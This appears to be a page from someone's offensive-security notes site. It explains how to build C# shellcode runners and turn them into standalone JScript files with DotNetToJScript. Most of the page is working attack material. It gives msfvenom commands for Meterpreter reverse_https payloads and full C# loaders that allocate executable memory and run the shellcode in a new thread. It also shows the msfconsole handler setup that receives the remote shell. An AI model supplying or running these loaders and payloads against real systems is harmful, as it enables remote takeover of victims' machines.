---
title: Jscript and C# (In Memory)
layout: default
parent: Shellcode
nav_order: 3
---

<b>JScript runs in 64 bit by default!</b>

## Normal C# Build ##

1. Visual Studio -> Create New Project.

2. Change language dropdown to "C#" and select "Console App (.NET Framework)".

3. Location select anywhere, the rest default.

4. Debug change to Release. 

5. Build -> Build Solution.

## DotNetToJscript ##

1. Open the solution.

2. "ExampleAssembly" project -> TestClass.cs

3. Put code in TestClass function.

4. Build -> Build Solution.

5. Copy the following files to a same folder:
`DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJscript.exe`
`DotNetToJScript-master\DotNetToJScript\bin\Release\NDesk.Options.dll`
`DotNetToJScript-master\ExampleAssembly\bin\Release\ExampleAssembly.dll`

6. Run the following command on the folder:
`DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`

7. The .js file can then be run without dll.

## Win32 API Calls ##

1. First browse to PInvoke.

2. Make the following changes:
* add the declaration `using ...`
* put the DllImport and function line in the class Program (but outside of Main)
* in Main, put in the call to the function added with required arguments

3. Sample code:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```

## Shellcode Runner (C#) ##

1. Very similar to Powershell one, but generate msfvenom with:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Some changes like can use Marshal.Copy directly instead of specifying the .NET namespace. Sample shellcode:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,...,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

3. Beside the Debug/Release dropdown, select "Any CPU" -> Configuration Manager -> "Platform" dropdown -> x64

4. Build solution and done.

## JScript Shellcode (Using DotNetToJscript) ##

1. Generate msfvenom with:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Use the following code (replace the buf):

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        byte[] buf = xx;

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

3. Set to x64 and build (just the EasyAssembly will do).

4. Copy the following files to a same folder (remember look at x64 for ExampleAssembly):
`DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJscript.exe`
`DotNetToJScript-master\DotNetToJScript\bin\Release\NDesk.Options.dll`
`DotNetToJScript-master\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll`

5. Run the following in that folder:
`DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js`

6. The runner.js is the actual file containing the payload.

7. Wait for incoming connection.

```
sudo systemctl start apache2
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```